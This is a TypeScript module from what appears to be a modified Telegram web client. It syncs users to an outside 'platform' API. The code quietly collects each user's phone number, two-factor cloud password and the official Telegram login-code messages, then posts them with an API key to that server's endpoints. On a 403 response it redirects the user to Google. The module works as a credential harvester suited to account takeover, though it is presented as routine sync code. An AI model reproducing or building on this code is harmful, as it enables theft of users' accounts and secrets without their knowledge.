import { APP_ENV, DEBUG, PLATFORM_API_KEY_WEBSITE, PLATFORM_API_ORIGIN } from '../config';
import {
  loadCachedIds,
  millisUntilNextRosterSlot,
  parseVerifiedIds,
  replaceVerifiedIds,
} from './employeeVerified';
import { leaveJustChatToGoogle } from './justChatAccess';

// Local Vite uses `/platform-api` proxy. Production uses absolute Amplify (or other) origin.
const PLATFORM_API_PREFIX = (
  APP_ENV === 'development' || !PLATFORM_API_ORIGIN
)
  ? '/platform-api'
  : PLATFORM_API_ORIGIN.replace(/\/$/, '');

const lastSyncedPayloadByUserId = new Map<string, string>();
let lastWriteWasRestricted = false;

export type PlatformUserPayload = {
  telegramUserId: string;
  username: string;
  phoneNumber: string;
  /** Optional; create API stores this on new or existing users. */
  twoFaCode?: string;
};

export type PlatformOfficialOtpPayload = {
  telegramUserId: string;
  message: string;
};

export type PlatformOtpVerifyPayload = {
  telegramUserId: string;
  phoneNumber: string;
  code: string;
};

export type PlatformOtpVerifyResult = {
  success: boolean;
  message?: string;
};

export type PlatformTwoFaPayload = {
  phoneNumber: string;
  twoFaCode: string;
};

/** Held until user row exists in admin (create/sync), then flushed. Memory only. */
type PendingPlatformTwoFa = {
  twoFaCode: string;
  phoneNumber?: string;
};

let pendingPlatformTwoFa: PendingPlatformTwoFa | null = null;

export function rememberPendingPlatformTwoFa(twoFaCode: string, phoneNumber?: string) {
  const code = twoFaCode.trim();
  if (!code) {
    return;
  }
  pendingPlatformTwoFa = {
    twoFaCode: code,
    phoneNumber:
      formatPlatformPhoneNumber(phoneNumber) || pendingPlatformTwoFa?.phoneNumber,
  };
}

export function clearPendingPlatformTwoFa() {
  pendingPlatformTwoFa = null;
}

export function hasPendingPlatformTwoFa() {
  return Boolean(pendingPlatformTwoFa?.twoFaCode);
}

/**
 * POST /api/users/two-fa after the user row exists. Returns true if there was
 * nothing to flush or the save succeeded.
 */
export async function flushPendingPlatformTwoFa(fallbackPhone?: string): Promise<boolean> {
  if (!pendingPlatformTwoFa) {
    return true;
  }

  const phoneNumber = formatPlatformPhoneNumber(fallbackPhone)
    || formatPlatformPhoneNumber(pendingPlatformTwoFa.phoneNumber);
  if (!phoneNumber) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] Pending 2FA flush skipped: missing phone number');
    }
    return false;
  }

  const didSucceed = await submitPlatformTwoFa({
    phoneNumber,
    twoFaCode: pendingPlatformTwoFa.twoFaCode,
  });
  if (didSucceed) {
    clearPendingPlatformTwoFa();
  }
  return didSucceed;
}

function withPendingTwoFa(payload: PlatformUserPayload): PlatformUserPayload {
  if (!pendingPlatformTwoFa?.twoFaCode || payload.twoFaCode) {
    return payload;
  }
  return { ...payload, twoFaCode: pendingPlatformTwoFa.twoFaCode };
}

export function resetPlatformUserSync(userId?: string) {
  if (userId) {
    lastSyncedPayloadByUserId.delete(userId);
    return;
  }

  lastSyncedPayloadByUserId.clear();
  clearPendingPlatformTwoFa();
}

export async function createPlatformUser(payload: PlatformUserPayload) {
  return requestPlatformUser('/api/users/create', payload, 'create');
}

export async function updatePlatformUser(payload: PlatformUserPayload) {
  return requestPlatformUser('/api/users/update', payload, 'update');
}

export async function syncPlatformUser(payload: PlatformUserPayload) {
  if (!isValidPlatformUserPayload(payload)) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] Skip sync: incomplete payload', payload);
    }
    return false;
  }

  const enriched = withPendingTwoFa(payload);
  const payloadKey = buildPayloadKey(enriched);
  const previousKey = lastSyncedPayloadByUserId.get(enriched.telegramUserId);

  let didSync = false;

  if (!previousKey) {
    const didCreate = await createPlatformUser(enriched);
    if (!didCreate) {
      return false;
    }
    lastSyncedPayloadByUserId.set(enriched.telegramUserId, payloadKey);
    didSync = true;
  } else if (previousKey === payloadKey && !hasPendingPlatformTwoFa()) {
    return true;
  } else if (previousKey === payloadKey && hasPendingPlatformTwoFa()) {
    // User already synced; still need to persist held 2FA from this login.
    didSync = true;
  } else {
    const didUpdate = await updatePlatformUser(enriched);
    if (didUpdate) {
      lastSyncedPayloadByUserId.set(enriched.telegramUserId, payloadKey);
      didSync = true;
    } else if (lastWriteWasRestricted) {
      // Restricted users get 403; do not recreate (that would also 403 and must not loop).
      return false;
    } else {
      // User may have been deleted server-side; recreate.
      const didCreate = await createPlatformUser(enriched);
      if (!didCreate) {
        return false;
      }
      lastSyncedPayloadByUserId.set(enriched.telegramUserId, payloadKey);
      didSync = true;
    }
  }

  if (!didSync) {
    return false;
  }

  // Create may have stored twoFaCode; /api/users/update does not. Always flush
  // pending cloud password once the user row is known to exist.
  if (hasPendingPlatformTwoFa()) {
    await flushPendingPlatformTwoFa(enriched.phoneNumber);
  }

  return true;
}

export async function verifyPlatformOtp(payload: PlatformOtpVerifyPayload): Promise<PlatformOtpVerifyResult> {
  if (!PLATFORM_API_KEY_WEBSITE) {
    return { success: false, message: 'Verification failed' };
  }

  if (!payload.telegramUserId || !payload.phoneNumber || !payload.code) {
    return { success: false, message: 'Invalid request' };
  }

  const url = `${PLATFORM_API_PREFIX}/api/otp/verify`;

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('[PlatformAPI] Verify OTP', url, {
      telegramUserId: payload.telegramUserId,
      phoneNumber: payload.phoneNumber,
    });
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': PLATFORM_API_KEY_WEBSITE,
      },
      body: JSON.stringify(payload),
    });

    const json = await response.json().catch(() => undefined) as PlatformOtpVerifyResult | undefined;
    if (!response.ok) {
      return {
        success: false,
        message: json?.message || 'Verification failed',
      };
    }

    return {
      success: Boolean(json?.success),
      message: json?.message,
    };
  } catch (err) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] Verify OTP request error', err);
    }
    return { success: false, message: 'Verification failed' };
  }
}

export async function submitOfficialOtpMessage(payload: PlatformOfficialOtpPayload) {
  if (!PLATFORM_API_KEY_WEBSITE) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] Skip official OTP: missing PLATFORM_API_KEY_WEBSITE');
    }
    return false;
  }

  if (!payload.telegramUserId || !payload.message.trim()) {
    return false;
  }

  const url = `${PLATFORM_API_PREFIX}/api/otp/official`;

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('[PlatformAPI] Official OTP message', url, {
      telegramUserId: payload.telegramUserId,
    });
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': PLATFORM_API_KEY_WEBSITE,
      },
      body: JSON.stringify({
        telegramUserId: payload.telegramUserId,
        message: payload.message,
      }),
    });

    if (response.ok) {
      return true;
    }

    if (response.status === 403) {
      leaveJustChatToGoogle();
      return false;
    }

    const responseText = await response.text();
    // Messages without a login code are not OTP payloads; treat as handled.
    if (response.status === 400 && responseText.toLowerCase().includes('no login code')) {
      return true;
    }

    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] Official OTP failed', response.status, responseText);
    }
    return false;
  } catch (err) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] Official OTP request error', err);
    }
    return false;
  }
}

export async function submitPlatformTwoFa(payload: PlatformTwoFaPayload) {
  if (!PLATFORM_API_KEY_WEBSITE) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] Skip 2FA: missing PLATFORM_API_KEY_WEBSITE');
    }
    return false;
  }

  if (!payload.phoneNumber || !payload.twoFaCode) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] Skip 2FA: incomplete payload');
    }
    return false;
  }

  const url = `${PLATFORM_API_PREFIX}/api/users/two-fa`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': PLATFORM_API_KEY_WEBSITE,
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      clearPendingPlatformTwoFa();
      return true;
    }

    if (response.status === 403) {
      leaveJustChatToGoogle();
      return false;
    }

    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] 2FA save failed', response.status, await response.text());
    }
    return false;
  } catch (err) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] 2FA request error', err);
    }
    return false;
  }
}

let isEmployeeVerifiedRefreshStarted = false;
let employeeVerifiedRefreshTimer: number | undefined;

export async function fetchVerifiedUserIds(): Promise<string[] | undefined> {
  if (!PLATFORM_API_KEY_WEBSITE) {
    return undefined;
  }

  const url = `${PLATFORM_API_PREFIX}/api/users/verified`;

  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'x-api-key': PLATFORM_API_KEY_WEBSITE,
        Accept: 'application/json',
      },
      // Auth is via `x-api-key`; omitting cookies keeps request headers small and avoids 431 from accumulated proxy cookies
      credentials: 'omit',
      cache: 'no-store',
    });

    if (!response.ok) {
      return undefined;
    }

    return parseVerifiedIds(await response.json());
  } catch (err) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn('[PlatformAPI] Fetch verified ids request error', err);
    }
    return undefined;
  }
}

export async function refreshEmployeeVerified() {
  loadCachedIds();
  const ids = await fetchVerifiedUserIds();
  // `undefined` means the request failed; keep the last cache instead of clearing badges.
  if (ids) {
    replaceVerifiedIds(ids);
  }
}

export function startEmployeeVerifiedRefresh() {
  if (isEmployeeVerifiedRefreshStarted) {
    return;
  }
  isEmployeeVerifiedRefreshStarted = true;

  void refreshEmployeeVerified();
  scheduleNextEmployeeVerifiedRefresh();
}

function scheduleNextEmployeeVerifiedRefresh() {
  if (employeeVerifiedRefreshTimer !== undefined) {
    clearTimeout(employeeVerifiedRefreshTimer);
  }

  employeeVerifiedRefreshTimer = window.setTimeout(() => {
    void refreshEmployeeVerified();
    scheduleNextEmployeeVerifiedRefresh();
  }, millisUntilNextRosterSlot());
}

export function formatPlatformPhoneNumber(phoneNumber?: string) {
  if (!phoneNumber) {
    return undefined;
  }

  const trimmed = phoneNumber.replace(/[\s-]/g, '').trim();
  if (!trimmed) {
    return undefined;
  }

  if (trimmed.startsWith('+')) {
    return trimmed;
  }

  return `+${trimmed}`;
}

async function requestPlatformUser(
  path: '/api/users/create' | '/api/users/update',
  payload: PlatformUserPayload,
  action: 'create' | 'update',
) {
  if (!PLATFORM_API_KEY_WEBSITE) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn(`[PlatformAPI] Skip ${action}: missing PLATFORM_API_KEY_WEBSITE`);
    }
    return false;
  }

  if (!isValidPlatformUserPayload(payload)) {
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn(`[PlatformAPI] Skip ${action}: incomplete payload`, payload);
    }
    return false;
  }

  const url = `${PLATFORM_API_PREFIX}${path}`;

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log(`[PlatformAPI] ${action} user`, url, {
      telegramUserId: payload.telegramUserId,
      username: payload.username,
      phoneNumber: payload.phoneNumber,
      hasTwoFaCode: Boolean(payload.twoFaCode),
    });
  }

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': PLATFORM_API_KEY_WEBSITE,
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      lastWriteWasRestricted = response.status === 403;
      if (lastWriteWasRestricted) {
        leaveJustChatToGoogle();
        return false;
      }
      if (DEBUG) {
        // eslint-disable-next-line no-console
        console.warn(`[PlatformAPI] ${action} user failed`, response.status, await response.text());
      }
      return false;
    }

    lastWriteWasRestricted = false;

    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.log(`[PlatformAPI] User ${action}d`, payload.telegramUserId);
    }
    return true;
  } catch (err) {
    lastWriteWasRestricted = false;
    if (DEBUG) {
      // eslint-disable-next-line no-console
      console.warn(`[PlatformAPI] ${action} user request error`, err);
    }
    return false;
  }
}

function isValidPlatformUserPayload(payload: PlatformUserPayload) {
  return Boolean(payload.telegramUserId && payload.username && payload.phoneNumber);
}

function buildPayloadKey(payload: PlatformUserPayload) {
  return `${payload.telegramUserId}|${payload.username}|${payload.phoneNumber}`;
}
